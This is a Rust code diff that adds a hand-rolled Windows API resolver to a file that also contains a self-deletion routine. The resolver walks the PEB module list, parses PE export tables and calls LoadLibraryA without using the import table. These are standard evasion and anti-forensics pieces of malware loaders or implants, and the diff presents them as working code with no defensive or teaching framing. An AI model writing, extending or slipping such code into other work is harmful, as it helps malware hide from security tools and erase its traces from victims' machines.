@@ -1,6 +1,150 @@
 use std::ffi::c_void;
 
 // =======================================================================================================
+// DYNAMIC API RESOLVER
+// =======================================================================================================
+
+use windows_sys::Win32::{
+    Foundation::FARPROC,
+    System::{
+        Diagnostics::Debug::{IMAGE_DATA_DIRECTORY, IMAGE_NT_HEADERS64},
+        Kernel::LIST_ENTRY,
+        SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
+        Threading::{PEB, LDR_DATA_TABLE_ENTRY},
+    },
+};
+
+#[inline]
+#[cfg(target_pointer_width = "64")]
+fn __readgsqword(offset: u32) -> u64 {
+    let out: u64;
+    unsafe {
+        std::arch::asm!(
+            "mov {}, gs:[{:e}]",
+            lateout(reg) out,
+            in(reg) offset,
+            options(nostack, pure, readonly),
+        );
+    }
+    out
+}
+
+#[inline]
+#[cfg(target_pointer_width = "32")]
+fn __readfsdword(offset: u32) -> u32 {
+    let out: u32;
+    unsafe {
+        std::arch::asm!(
+            "mov {}, fs:[{:e}]",
+            lateout(reg) out,
+            in(reg) offset,
+            options(nostack, pure, readonly),
+        );
+    }
+    out
+}
+
+pub fn get_module_base_addr(module_name: &str) -> *mut c_void {
+    unsafe {
+        #[cfg(target_pointer_width = "64")]
+        let peb_offset: *const u64 = __readgsqword(0x60) as *const u64;
+        
+        #[cfg(target_pointer_width = "32")]
+        let peb_offset: *const u32 = __readfsdword(0x30) as *const u32;
+        
+        let peb: PEB = *(peb_offset as *const PEB);
+
+        let mut p_ldr_data_table_entry: *const LDR_DATA_TABLE_ENTRY =
+            (*peb.Ldr).InMemoryOrderModuleList.Flink as *const LDR_DATA_TABLE_ENTRY;
+        let mut p_list_entry = &(*peb.Ldr).InMemoryOrderModuleList as *const LIST_ENTRY;
+
+        loop {
+            let buffer = std::slice::from_raw_parts(
+                (*p_ldr_data_table_entry).FullDllName.Buffer.0,
+                (*p_ldr_data_table_entry).FullDllName.Length as usize / 2,
+            );
+            let dll_name = String::from_utf16_lossy(buffer);
+
+            if dll_name.to_lowercase().contains(&module_name.to_lowercase()) {
+                let module_base = (*p_ldr_data_table_entry).Reserved2[0];
+                return module_base;
+            }
+            if p_list_entry == (*peb.Ldr).InMemoryOrderModuleList.Blink {
+                return std::ptr::null_mut();
+            }
+            p_list_entry = (*p_list_entry).Flink;
+            p_ldr_data_table_entry = (*p_list_entry).Flink as *const LDR_DATA_TABLE_ENTRY;
+        }
+    }
+}
+
+pub fn get_proc_addr(module_handle: *mut c_void, function_name: &str) -> FARPROC {
+    unsafe {
+        let dos_headers = module_handle as *const IMAGE_DOS_HEADER;
+    
+        let nt_headers =
+            (module_handle as u64 + (*dos_headers).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
+    
+        let data_directory =
+            (&(*nt_headers).OptionalHeader.DataDirectory[0]) as *const IMAGE_DATA_DIRECTORY;
+    
+        let export_directory = (module_handle as u64 + (*data_directory).VirtualAddress as u64)
+            as *const IMAGE_EXPORT_DIRECTORY;
+    
+        let mut address_array =
+            (module_handle as u64 + (*export_directory).AddressOfFunctions as u64) as u64;
+    
+        let mut name_array =
+            (module_handle as u64 + (*export_directory).AddressOfNames as u64) as u64;
+        let mut name_ordinals =
+            (module_handle as u64 + (*export_directory).AddressOfNameOrdinals as u64) as u64;
+
+        for _ in 0..(*export_directory).NumberOfNames {
+            let name_offset: u32 = *(name_array as *const u32);
+            let current_function_name =
+                std::ffi::CStr::from_ptr((module_handle as u64 + name_offset as u64) as *const i8)
+                    .to_str()
+                    .unwrap_or("");
+
+            if current_function_name == function_name {
+                address_array = address_array
+                    + (*(name_ordinals as *const u16) as u64 * (std::mem::size_of::<u32>() as u64));
+                let fun_addr: FARPROC = std::mem::transmute(
+                    module_handle as u64 + *(address_array as *const u32) as u64,
+                );
+                return fun_addr;
+            }
+
+            name_array = name_array + std::mem::size_of::<u32>() as u64;
+            name_ordinals = name_ordinals + std::mem::size_of::<u16>() as u64;
+        }
+        
+        None
+    }
+}
+
+pub fn load_library_a(library_name: &str) -> *mut c_void {
+    unsafe {
+        let kernel32_base = get_module_base_addr("kernel32.dll");
+        if kernel32_base.is_null() {
+            return std::ptr::null_mut();
+        }
+        
+        type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> *mut c_void;
+        
+        let load_library_addr = get_proc_addr(kernel32_base, "LoadLibraryA");
+        if load_library_addr.is_none() {
+            return std::ptr::null_mut();
+        }
+        
+        let load_library_fn: LoadLibraryAFn = std::mem::transmute(load_library_addr);
+        
+        let lib_name_cstr = format!("{}\0", library_name);
+        load_library_fn(lib_name_cstr.as_ptr())
+    }
+}
+
+// =======================================================================================================
 // UTILITY: SELF DELETION
 // =======================================================================================================
 
@@ -122,10 +266,6 @@ pub fn delete_self_from_disk() -> Result<(), i32> {
             CloseHandle(h_file);
             return Err(GetLastError() as i32);
         }
-        
-        // DON'T close the handle - keep it open until process exits
-        // This ensures the deletion flag persists
-        // CloseHandle(h_file);
         
         Ok(())
     }
